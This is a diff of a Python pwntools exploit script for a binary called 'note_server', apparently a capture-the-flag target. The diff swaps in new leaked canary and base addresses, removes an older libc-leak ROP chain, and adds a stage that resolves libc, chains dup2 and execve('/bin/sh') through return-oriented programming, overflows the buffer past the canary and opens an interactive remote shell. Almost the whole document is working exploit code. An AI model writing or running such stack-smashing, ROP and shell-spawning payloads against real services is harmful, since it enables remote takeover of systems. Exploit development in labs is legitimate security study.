@@ -83,18 +83,16 @@ r.close()
 
 ################################################################################
 # --- leak libc
-################################################################################
-
-canary = 0xe770dedb2dac6500
+canary = 0xfb6204523491cf00
 b_canary = p64(canary)
+################################################################################
+'''
 
-
-base = 0x00005571c2f8e674
+base = 0x0000559e42d53674
 b_base = p64(base-0x1674).decode('latin-1')
 bin_base = u64(b_base)
 
 elf  = ELF("./note_server",checksec=False)
-#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so",checksec=False)
 elf.address = bin_base
 rop = ROP(elf)
 
@@ -112,51 +110,34 @@ payload += fill
 payload += smash_cpy
 payload += read
 print(deliver_payload(payload))
-
 '''
-ropper:   pop rdi; ret 
-int:      SOCKFD       
-ropper:   pop rsi; ret 
-readelf:  got.send     
-ropper:   pop rdx; ret 
-objdump:  call write   
 
-pop_rdi = bin_base + 0x16eb
-pop_rsi_pop_r15_ret = bin_base + 0x16e9
-got_err = 0x3fb0
-pop_rdx = 
-call_write = 
+################################################################################
+# --- shell me
+################################################################################
+libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so",checksec=False)
 
-pop_rdi_ret =         bin_base + 0x16eb
-pop_rsi_pop_r15_ret = bin_base + 0x16e9
-pop_rdx_ret =         bin_base + 0x1265
-got_send =            bin_base + 0x4050
-call_write =          bin_base + 0x154e
 
-rop  = p64(pop_rdi_ret)
-rop += p64(SOCKFD)
-rop += p64(pop_rsi_pop_r15_ret)
-rop += p64(got_send)
-rop += "C"*8
-rop += p64(pop_rdx_ret)
-rop += p64(8)
-rop += p64(call_write)
+write = 0x00007f03d5ca7660
+libc.address = write - libc.symbols['write']
+rop_libc = ROP(libc)
+binsh = next(libc.search("/bin/sh\x00".encode()))
 
-payload = "A"*56
-payload += CANARY
-payload += "B"*8
-payload += str(rop)
+r=remote(RHOST,RPORT)
+rop_libc.dup2(0x04,0x00)
+rop_libc.dup2(0x04,0x01)
+rop_libc.execve(binsh,0x00,0x00)
+chain = rop_libc.chain()
+#print(len(chain)) # 136
 
-# send payload
-con = remote("localhost", 1337)
-con.send(payload)
-con.recvline()
-res = con.clean(timeout=TIMEOUT)
-con.close()
-
-# get libc base address
-libc_send = u64(res)
-print("[\033[92m+\033[0m] libc_send = " + hex(libc_send))
-libc.address = libc_send - libc.sym["send"]
-print("[\033[92m+\033[0m] libc_base = " + hex(libc.address))
-'''
+pad = b'b'*95
+payload = b'\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00' + b_canary + b'\x00\x00\x00\x00\x00\x00\x00\x00' + chain
+payload += pad
+payload += buffer_filler
+payload += buffer_filler
+payload += buffer_filler
+payload += fill
+payload += smash_cpy
+payload += read
+r.send(payload)
+r.interactive()
